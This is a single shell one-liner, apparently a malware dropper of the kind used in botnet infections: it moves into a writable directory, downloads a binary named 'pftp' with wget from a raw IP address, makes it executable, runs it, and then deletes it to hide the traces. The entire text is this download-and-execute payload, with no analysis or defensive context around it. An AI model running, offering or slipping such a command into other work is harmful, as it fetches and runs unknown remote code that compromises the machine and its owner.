cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.24/pftp; chmod +x pftp; ./pftp; rm -rf pftp
